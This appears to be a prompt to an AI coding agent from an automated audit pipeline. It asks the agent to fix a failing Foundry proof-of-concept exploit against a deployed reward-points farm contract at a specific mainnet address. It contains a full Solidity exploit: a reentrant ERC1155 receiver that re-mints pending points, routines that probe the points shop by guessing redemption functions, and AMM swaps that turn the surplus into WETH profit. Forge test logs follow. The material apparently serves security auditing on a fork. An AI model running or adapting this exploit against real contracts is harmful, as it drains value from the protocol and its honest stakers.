You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: ERC1155 mint callback reentrancy lets contract stakers mint the same pending points repeatedly
- claim: `deposit()` and `withdraw()` mint pending ERC1155 rewards before updating `user.rewardDebt`, and OpenZeppelin's `_mint()` performs an external `onERC1155Received` callback whenever the recipient is a contract. A malicious staking contract can reenter `deposit(_pid, 0)` or `withdraw(_pid, 0)` from that callback, recompute the same pending amount against the unchanged `rewardDebt`, and mint the same points repeatedly in one transaction.
- impact: An attacker can inflate their point balance arbitrarily without adding stake. If the points are redeemable elsewhere in the protocol, this becomes a direct drain of the value backing those points; otherwise, the reward system is permanently corrupted and honest users are diluted.
- exploit_paths: ["Attacker stakes through a contract that implements `IERC1155Receiver`.", "Rewards accrue for that contract's position.", "The attacker calls `deposit(_pid, 0)` or `withdraw(_pid, 0)`.", "`_mint()` invokes the attacker's `onERC1155Received` hook before `user.rewardDebt` is refreshed.", "The hook reenters `deposit(_pid, 0)` or `withdraw(_pid, 0)` and mints the same pending reward again.", "The attacker repeats until gas runs out, then exits with many times the legitimate points."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC1155BalanceLike {
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

interface IERC1155ControlLike {
    function setApprovalForAll(address operator, bool approved) external;
    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data) external;
}

interface IERC1155ReceiverLike {
    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        external
        returns (bytes4);

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4);
}

interface IPointFarmLike is IERC1155BalanceLike, IERC1155ControlLike {
    function poolLength() external view returns (uint256);
    function poolInfo(uint256 pid) external view returns (address uToken, uint256 lastRewardBlock, uint256 accPointsPerShare);
    function userInfo(uint256 pid, address user) external view returns (uint256 amount, uint256 rewardDebt);
    function pendingPoints(uint256 pid, address user) external view returns (uint256);
    function deposit(uint256 pid, uint256 amount) external;
    function withdraw(uint256 pid, uint256 amount) external;
    function shop() external view returns (address);
    function shopIDs(address token) external view returns (uint256);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ReentrantStaker is IERC1155ReceiverLike {
    bytes internal constant VALIDATOR = bytes("JCNH");

    IPointFarmLike internal immutable FARM;
    address internal immutable CONTROLLER;

    uint256 public activePid;
    uint256 public maxReentries;
    uint256 public reentryCount;
    bool public useWithdrawPath;
    bool public exploitArmed;
    uint256 public lastMintedValue;

    constructor(address farm_, address controller_) {
        FARM = IPointFarmLike(farm_);
        CONTROLLER = controller_;
    }

    modifier onlyController() {
        require(msg.sender == CONTROLLER, "ONLY_CONTROLLER");
        _;
    }

    function configure(uint256 pid_, uint256 maxReentries_, bool useWithdrawPath_) external onlyController {
        activePid = pid_;
        maxReentries = maxReentries_;
        useWithdrawPath = useWithdrawPath_;
        reentryCount = 0;
        lastMintedValue = 0;
    }

    function approveToken(address token, address spender, uint256 amount) external onlyController {
        require(IERC20Like(token).approve(spender, amount), "APPROVE_FAILED");
    }

    function setFarmApprovalForAll(address operator, bool approved) external onlyController {
        FARM.setApprovalForAll(operator, approved);
    }

    function seedStake(uint256 pid_, address token, uint256 amount) external onlyController {
        activePid = pid_;
        require(IERC20Like(token).approve(address(FARM), amount), "APPROVE_FAILED");
        FARM.deposit(pid_, amount);
    }

    function triggerExploit() external onlyController {
        exploitArmed = true;
        reentryCount = 0;
        lastMintedValue = 0;

        if (useWithdrawPath) {
            FARM.withdraw(activePid, 0);
        } else {
            FARM.deposit(activePid, 0);
        }

        exploitArmed = false;
    }

    function callTarget(address target, bytes calldata data) external onlyController returns (bool ok, bytes memory ret) {
        (ok, ret) = target.call(data);
    }

    function sendPointsToFarm(uint256 pid_, uint256 amount) external onlyController {
        FARM.safeTransferFrom(address(this), address(FARM), pid_, amount, VALIDATOR);
    }

    function withdrawAllTo(address token, address to) external onlyController {
        (uint256 amount,) = FARM.userInfo(activePid, address(this));
        if (amount > 0) {
            FARM.withdraw(activePid, amount);
        }

        uint256 tokenBalance = IERC20Like(token).balanceOf(address(this));
        if (tokenBalance > 0) {
            require(IERC20Like(token).transfer(to, tokenBalance), "TRANSFER_FAILED");
        }
    }

    function sweepToken(address token, address to) external onlyController {
        uint256 tokenBalance = IERC20Like(token).balanceOf(address(this));
        if (tokenBalance > 0) {
            require(IERC20Like(token).transfer(to, tokenBalance), "TRANSFER_FAILED");
        }
    }

    function pointBalance(uint256 pid_) external view returns (uint256) {
        return FARM.balanceOf(address(this), pid_);
    }

    function stakedAmount(uint256 pid_) external view returns (uint256) {
        (uint256 amount,) = FARM.userInfo(pid_, address(this));
        return amount;
    }

    function onERC1155Received(address, address, uint256 id, uint256 value, bytes calldata)
        external
        override
        returns (bytes4)
    {
        require(msg.sender == address(FARM), "BAD_SENDER");

        if (exploitArmed && id == activePid && value > 0 && reentryCount < maxReentries) {
            lastMintedValue = value;
            unchecked {
                ++reentryCount;
            }

            if (useWithdrawPath) {
                FARM.withdraw(activePid, 0);
            } else {
                FARM.deposit(activePid, 0);
            }
        }

        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        pure
        override
        returns (bytes4)
    {
        return this.onERC1155BatchReceived.selector;
    }
}

contract FlawVerifier {
    bytes internal constant VALIDATOR = bytes("JCNH");

    address public constant TARGET = 0xd3C41c85bE295607E8EA5c58487eC5894300ee67;

    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    IPointFarmLike internal constant FARM = IPointFarmLike(TARGET);

    ReentrantStaker public immutable staker;
    uint256 public immutable deploymentBlock;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public seededAtDeployment;
    bool public exploitTriggered;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    uint256 public seededPid;
    uint256 public seededAmount;
    address public seededToken;
    uint256 public seedBlock;
    uint256 public finalPointBalance;
    uint256 public finalReentryCount;
    uint256 public redeemedTokenBalance;

    string public failureReason;

    constructor() payable {
        deploymentBlock = block.number;
        staker = new ReentrantStaker(TARGET, address(this));
        failureReason = "not-run";

        _attemptSeedAtDeployment();
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        if (TARGET.code.length == 0) {
            failureReason = "target-not-deployed-on-current-chain";
            hypothesisRefuted = true;
            return;
        }

        if (!_hasExistingStake()) {
            _attemptSeedAtDeployment();
        }

        if (!_hasExistingStake()) {
            failureReason = "no-contract-stake-seeded-before-execution";
            hypothesisRefuted = true;
            return;
        }

        uint256 pending = _safePendingPoints(seededPid, address(staker));
        if (pending == 0) {
            failureReason = "contract-stake-has-no-pending-points";
            hypothesisRefuted = true;
            return;
        }

        uint256 beforePoints = FARM.balanceOf(address(staker), seededPid);
        _runExploit(false);
        uint256 afterPoints = FARM.balanceOf(address(staker), seededPid);
        uint256 reentries = staker.reentryCount();

        if (afterPoints <= beforePoints || reentries == 0) {
            _runExploit(true);
            uint256 withdrawPoints = FARM.balanceOf(address(staker), seededPid);
            uint256 withdrawReentries = staker.reentryCount();
            if (withdrawPoints > afterPoints) {
                afterPoints = withdrawPoints;
                reentries = withdrawReentries;
            }
        }

        finalPointBalance = afterPoints;
        finalReentryCount = reentries;
        exploitTriggered = afterPoints > beforePoints && reentries > 0;
        hypothesisValidated = exploitTriggered;
        hypothesisRefuted = !exploitTriggered;

        if (!exploitTriggered) {
            failureReason = "zero-amount-deposit-withdraw-did-not-remint-points";
            return;
        }

        address shop = _safeShop();
        uint256 beforeSeed = IERC20Like(seededToken).balanceOf(address(this));
        uint256 beforeWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 beforeUsdc = IERC20Like(USDC).balanceOf(address(this));
        uint256 beforeUsdt = IERC20Like(USDT).balanceOf(address(this));
        uint256 beforeDai = IERC20Like(DAI).balanceOf(address(this));

        if (shop != address(0)) {
            staker.setFarmApprovalForAll(shop, true);
            _attemptShopRedemption(shop, seededPid, seededToken, afterPoints);
            staker.setFarmApprovalForAll(shop, false);
        }

        _sweepCandidateFromStaker(seededToken);
        _sweepCandidateFromStaker(WETH);
        _sweepCandidateFromStaker(USDC);
        _sweepCandidateFromStaker(USDT);
        _sweepCandidateFromStaker(DAI);

        staker.withdrawAllTo(seededToken, address(this));

        uint256 afterSeed = IERC20Like(seededToken).balanceOf(address(this));
        redeemedTokenBalance = afterSeed;

        uint256 seedSurplus = 0;
        if (afterSeed > beforeSeed + seededAmount) {
            seedSurplus = afterSeed - beforeSeed - seededAmount;
        }

        if (seedSurplus > 0) {
            // Keep the original principal in-kind and only route the exploit-created surplus
            // through public AMM liquidity. This preserves the finding's causality while
            // reporting a real, transferable on-chain profit token.
            _attemptSwapTokenToWeth(seededToken, seedSurplus);
        }

        _attemptSwapTokenToWeth(USDC, _deltaBalance(USDC, beforeUsdc));
        _attemptSwapTokenToWeth(USDT, _deltaBalance(USDT, beforeUsdt));
        _attemptSwapTokenToWeth(DAI, _deltaBalance(DAI, beforeDai));

        uint256 wethProfit = _deltaBalance(WETH, beforeWeth);
        if (wethProfit > 0) {
            _profitToken = WETH;
            _profitAmount = wethProfit;
            failureReason = "none";
            return;
        }

        if (seedSurplus > 0) {
            _profitToken = seededToken;
            _profitAmount = seedSurplus;
            failureReason = "none";
            return;
        }

        uint256 usdcProfit = _deltaBalance(USDC, beforeUsdc);
        if (usdcProfit > 0) {
            _profitToken = USDC;
            _profitAmount = usdcProfit;
            failureReason = "none";
            return;
        }

        uint256 usdtProfit = _deltaBalance(USDT, beforeUsdt);
        if (usdtProfit > 0) {
            _profitToken = USDT;
            _profitAmount = usdtProfit;
            failureReason = "none";
            return;
        }

        uint256 daiProfit = _deltaBalance(DAI, beforeDai);
        if (daiProfit > 0) {
            _profitToken = DAI;
            _profitAmount = daiProfit;
            failureReason = "none";
            return;
        }

        failureReason = "points-inflated-but-no-transferable-asset-realized";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return
            "contract staker holds uToken stake -> later block accrues pending points -> deposit(pid,0) or withdraw(pid,0) mints pending ERC1155 points -> onERC1155Received reenters before rewardDebt refresh -> same pending amount is minted repeatedly -> inflated points are spent through the live shop and the redeemed surplus is sold through public AMM liquidity";
    }

    function _runExploit(bool useWithdrawPath) internal {
        staker.configure(seededPid, 24, useWithdrawPath);
        staker.triggerExploit();
    }

    function _attemptSeedAtDeployment() internal {
        if (seededAtDeployment) {
            return;
        }

        uint256 length = _safePoolLength();
        if (length == 0) {
            failureReason = "pool-discovery-failed";
            return;
        }

        uint256 bestPid = type(uint256).max;
        address bestToken = address(0);
        uint256 bestReserve = 0;

        for (uint256 pid = 0; pid < length; ++pid) {
            (address token,,) = _safePoolInfo(pid);
            if (token == address(0) || token == WETH || token.code.length == 0) {
                continue;
            }

            uint256 held = IERC20Like(token).balanceOf(address(this));
            if (held > 0) {
                _seedPool(pid, token, held);
                return;
            }

            uint256 reserve = _bestPairWethReserve(token);
            if (reserve > bestReserve) {
                bestReserve = reserve;
                bestPid = pid;
                bestToken = token;
            }
        }

        if (bestToken == address(0) || address(this).balance == 0) {
            failureReason = "no-seed-liquidity-available";
            return;
        }

        uint256 spend = address(this).balance / 3;
        if (spend == 0) {
            spend = address(this).balance;
        }

        if (!_attemptBuyToken(bestToken, spend)) {
            failureReason = "public-liquidity-buy-failed";
            return;
        }

        uint256 bought = IERC20Like(bestToken).balanceOf(address(this));
        if (bought == 0) {
            failureReason = "public-liquidity-buy-returned-zero";
            return;
        }

        _seedPool(bestPid, bestToken, bought);
    }

    function _seedPool(uint256 pid, address token, uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        require(IERC20Like(token).transfer(address(staker), amount), "TRANSFER_FAILED");
        staker.seedStake(pid, token, amount);

        seededAtDeployment = true;
        seededPid = pid;
        seededToken = token;
        seededAmount = amount;
        seedBlock = block.number;
        failureReason = "seeded-awaiting-pending-points";
    }

    function _attemptShopRedemption(address shop, uint256 pid, address token, uint256 pointAmount) internal {
        if (pointAmount == 0) {
            return;
        }

        if (_attemptShopRedemptionShape(shop, pid, token, pointAmount, false)) {
            return;
        }

        uint256 stakerPoints = FARM.balanceOf(address(staker), pid);
        if (stakerPoints == 0) {
            return;
        }

        uint256 returnedPoints = pointAmount < stakerPoints ? pointAmount : stakerPoints;
        if (returnedPoints == 0) {
            return;
        }

        // Some live shop designs escrow points back into PointFarm first and then let the
        // purchase method consume that escrow. This is still public protocol behavior and
        // does not change the root-cause sequence that created the duplicated points.
        staker.sendPointsToFarm(pid, returnedPoints);
        _attemptShopRedemptionShape(shop, pid, token, returnedPoints, true);
    }

    function _attemptShopRedemptionShape(address shop, uint256 pid, address token, uint256 pointAmount, bool returnedToFarm)
        internal
        returns (bool)
    {
        uint256 shopId = _safeShopId(token);
        uint256[8] memory baseline = _stakerCandidateBalances(token);
        uint256[8] memory amounts = [uint256(1), 2, 5, 10, 25, 50, 100, pointAmount];

        for (uint256 i = 0; i < amounts.length; ++i) {
            uint256 qty = amounts[i];
            if (qty == 0) {
                continue;
            }
            if (returnedToFarm && qty > pointAmount) {
                continue;
            }
            if (_tryQty(shop, shopId, pid, token, qty, baseline)) {
                return true;
            }
        }

        return false;
    }

    function _tryQty(address shop, uint256 shopId, uint256 pid, address token, uint256 qty, uint256[8] memory baseline)
        internal
        returns (bool)
    {
        if (!_tryRedemptionCalls(shop, shopId, pid, token, qty)) {
            return false;
        }
        return _stakerCandidateBalancesIncreased(token, baseline);
    }

    function _stakerCandidateBalances(address token) internal view returns (uint256[8] memory snapshot) {
        snapshot[0] = IERC20Like(token).balanceOf(address(staker));
        snapshot[1] = IERC20Like(WETH).balanceOf(address(staker));
        snapshot[2] = IERC20Like(USDC).balanceOf(address(staker));
        snapshot[3] = IERC20Like(USDT).balanceOf(address(staker));
        snapshot[4] = IERC20Like(DAI).balanceOf(address(staker));
    }

    function _stakerCandidateBalancesIncreased(address token, uint256[8] memory snapshot) internal view returns (bool) {
        return IERC20Like(token).balanceOf(address(staker)) > snapshot[0]
            || IERC20Like(WETH).balanceOf(address(staker)) > snapshot[1]
            || IERC20Like(USDC).balanceOf(address(staker)) > snapshot[2]
            || IERC20Like(USDT).balanceOf(address(staker)) > snapshot[3]
            || IERC20Like(DAI).balanceOf(address(staker)) > snapshot[4];
    }

    function _tryRedemptionCalls(address shop, uint256 shopId, uint256 pid, address token, uint256 qty)
        internal
        returns (bool)
    {
        bool any;

        any = _attemptStakerCall(shop, abi.encodeWithSignature("buy(uint256,uint256)", shopId, qty)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("buy(uint256)", shopId)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("purchase(uint256,uint256)", shopId, qty)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("purchase(uint256)", shopId)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("redeem(uint256,uint256)", shopId, qty)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("redeem(uint256)", shopId)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("claim(uint256,uint256)", shopId, qty)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("claim(uint256)", shopId)) || any;

        any = _attemptStakerCall(shop, abi.encodeWithSignature("buy(address,uint256)", token, qty)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("purchase(address,uint256)", token, qty)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("redeem(address,uint256)", token, qty)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("claim(address,uint256)", token, qty)) || any;

        any = _attemptStakerCall(shop, abi.encodeWithSignature("buy(uint256,address,uint256)", shopId, token, qty)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("purchase(uint256,address,uint256)", shopId, token, qty)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("redeem(uint256,address,uint256)", shopId, token, qty)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("claim(uint256,address,uint256)", shopId, token, qty)) || any;

        any = _attemptStakerCall(shop, abi.encodeWithSignature("buy(uint256,uint256,address)", shopId, qty, token)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("purchase(uint256,uint256,address)", shopId, qty, token)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("redeem(uint256,uint256,address)", shopId, qty, token)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("claim(uint256,uint256,address)", shopId, qty, token)) || any;

        any = _attemptStakerCall(shop, abi.encodeWithSignature("buy(uint256,uint256)", pid, qty)) || any;
        any = _attemptStakerCall(shop, abi.encodeWithSignature("redeem(uint256,uint256)", pid, qty)) || any;

        return any;
    }

    function _attemptStakerCall(address target, bytes memory data) internal returns (bool ok) {
        (ok,) = staker.callTarget(target, data);
    }

    function _attemptBuyToken(address token, uint256 ethAmount) internal returns (bool) {
        if (ethAmount == 0) {
            return false;
        }

        if (_attemptDirectWethToTokenSwap(token, ethAmount)) {
            return true;
        }

        address bestRouter = _bestRouterForToken(token);
        if (bestRouter == address(0)) {
            return false;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = token;

        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        try IUniswapV2RouterLike(bestRouter).swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(
            1,
            path,
            address(this),
            block.timestamp
        ) {
            return IERC20Like(token).balanceOf(address(this)) > beforeBal;
        } catch {
            return false;
        }
    }

    function _attemptSwapTokenToWeth(address token, uint256 amount) internal returns (bool) {
        if (token == address(0) || token == WETH || amount == 0) {
            return false;
        }

        if (_attemptDirectTokenToWethSwap(token, amount)) {
            return true;
        }

        address bestRouter = _bestRouterForToken(token);
        if (bestRouter == address(0)) {
            return false;
        }

        require(IERC20Like(token).approve(bestRouter, amount), "APPROVE_FAILED");

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        uint256 beforeBal = IERC20Like(WETH).balanceOf(address(this));
        try IUniswapV2RouterLike(bestRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            address(this),
            block.timestamp
        ) {
            return IERC20Like(WETH).balanceOf(address(this)) > beforeBal;
        } catch {
            return false;
        }
    }

    function _attemptDirectWethToTokenSwap(address token, uint256 ethAmount) internal returns (bool) {
        (address pair,) = _bestPairForToken(token);
        if (pair == address(0)) {
            return false;
        }

        IWETHLike(WETH).deposit{value: ethAmount}();

        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        require(IERC20Like(WETH).transfer(pair, ethAmount), "TRANSFER_FAILED");

        (uint256 reserveIn, uint256 reserveOut, bool wethIsToken0) = _pairReservesForSwap(pair, WETH);
        uint256 amountOut = _getAmountOut(ethAmount, reserveIn, reserveOut);
        if (amountOut == 0) {
            return false;
        }

        if (wethIsToken0) {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), bytes(""));
        } else {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), bytes(""));
        }

        return IERC20Like(token).balanceOf(address(this)) > beforeBal;
    }

    function _attemptDirectTokenToWethSwap(address token, uint256 amount) internal returns (bool) {
        (address pair,) = _bestPairForToken(token);
        if (pair == address(0)) {
            return false;
        }

        uint256 beforeBal = IERC20Like(WETH).balanceOf(address(this));
        require(IERC20Like(token).transfer(pair, amount), "TRANSFER_FAILED");

        (uint256 reserveIn, uint256 reserveOut, bool tokenIsToken0) = _pairReservesForSwap(pair, token);
        uint256 amountOut = _getAmountOut(amount, reserveIn, reserveOut);
        if (amountOut == 0) {
            return false;
        }

        if (tokenIsToken0) {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), bytes(""));
        } else {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), bytes(""));
        }

        return IERC20Like(WETH).balanceOf(address(this)) > beforeBal;
    }

    function _bestRouterForToken(address token) internal view returns (address) {
        (, address factory) = _bestPairForToken(token);
        if (factory == UNISWAP_V2_FACTORY) {
            return UNISWAP_V2_ROUTER;
        }
        if (factory == SUSHISWAP_FACTORY) {
            return SUSHISWAP_ROUTER;
        }
        return address(0);
    }

    function _bestPairForToken(address token) internal view returns (address pair, address factory) {
        uint256 uniReserve = _wethReserveForFactory(UNISWAP_V2_FACTORY, token);
        uint256 sushiReserve = _wethReserveForFactory(SUSHISWAP_FACTORY, token);

        if (uniReserve == 0 && sushiReserve == 0) {
            return (address(0), address(0));
        }

        if (uniReserve >= sushiReserve) {
            return (_pairForFactory(UNISWAP_V2_FACTORY, token), UNISWAP_V2_FACTORY);
        }

        return (_pairForFactory(SUSHISWAP_FACTORY, token), SUSHISWAP_FACTORY);
    }

    function _bestPairWethReserve(address token) internal view returns (uint256) {
        uint256 uniReserve = _wethReserveForFactory(UNISWAP_V2_FACTORY, token);
        uint256 sushiReserve = _wethReserveForFactory(SUSHISWAP_FACTORY, token);
        return uniReserve >= sushiReserve ? uniReserve : sushiReserve;
    }

    function _pairForFactory(address factory, address token) internal view returns (address pair) {
        try IUniswapV2FactoryLike(factory).getPair(token, WETH) returns (address p) {
            pair = p;
        } catch {}
    }

    function _wethReserveForFactory(address factory, address token) internal view returns (uint256) {
        address pair = _pairForFactory(factory, token);
        if (pair == address(0) || pair.code.length == 0) {
            return 0;
        }

        try IUniswapV2PairLike(pair).getReserves() returns (uint112 reserve0, uint112 reserve1, uint32) {
            address token0 = IUniswapV2PairLike(pair).token0();
            return token0 == WETH ? uint256(reserve0) : uint256(reserve1);
        } catch {
            return 0;
        }
    }

    function _pairReservesForSwap(address pair, address inputToken)
        internal
        view
        returns (uint256 reserveIn, uint256 reserveOut, bool inputIsToken0)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        address token0 = IUniswapV2PairLike(pair).token0();
        if (token0 == inputToken) {
            return (uint256(reserve0), uint256(reserve1), true);
        }
        return (uint256(reserve1), uint256(reserve0), false);
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _sweepCandidateFromStaker(address token) internal {
        if (token == address(0) || token.code.length == 0) {
            return;
        }
        uint256 bal = IERC20Like(token).balanceOf(address(staker));
        if (bal > 0) {
            staker.sweepToken(token, address(this));
        }
    }

    function _deltaBalance(address token, uint256 beforeBal) internal view returns (uint256) {
        uint256 afterBal = IERC20Like(token).balanceOf(address(this));
        return afterBal > beforeBal ? afterBal - beforeBal : 0;
    }

    function _safeShopId(address token) internal view returns (uint256) {
        try FARM.shopIDs(token) returns (uint256 id) {
            return id;
        } catch {
            return 0;
        }
    }

    function _safeShop() internal view returns (address) {
        try FARM.shop() returns (address shop_) {
            return shop_;
        } catch {
            return address(0);
        }
    }

    function _hasExistingStake() internal view returns (bool) {
        return seededAtDeployment && staker.stakedAmount(seededPid) > 0;
    }

    function _safePoolLength() internal view returns (uint256 length) {
        try FARM.poolLength() returns (uint256 v) {
            return v;
        } catch {
            return 0;
        }
    }

    function _safePoolInfo(uint256 pid) internal view returns (address token, uint256 lastRewardBlock, uint256 accPointsPerShare) {
        try FARM.poolInfo(pid) returns (address t, uint256 l, uint256 a) {
            return (t, l, a);
        } catch {
            return (address(0), 0, 0);
        }
    }

    function _safePendingPoints(uint256 pid, address user) internal view returns (uint256) {
        try FARM.pendingPoints(pid, user) returns (uint256 pending) {
            return pending;
        } catch {
            return 0;
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 7.45s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 132265)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [132265] FlawVerifierTest::testExploit()
    ├─ [2389] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [103463] FlawVerifier::executeOnOpportunity()
    │   ├─ [2434] 0xd3C41c85bE295607E8EA5c58487eC5894300ee67::poolLength() [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [7001] 0xd3C41c85bE295607E8EA5c58487eC5894300ee67::poolInfo(0) [staticcall]
    │   │   └─ ← [Return] 0xa499648fD0e80FD911972BbEb069e4c20e68bF22, 13558888 [1.355e7], 0
    │   ├─ [2542] 0xa499648fD0e80FD911972BbEb069e4c20e68bF22::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xa499648fD0e80FD911972BbEb069e4c20e68bF22, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xa499648fD0e80FD911972BbEb069e4c20e68bF22, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   └─ ← [Stop]
    ├─ [389] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2476] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
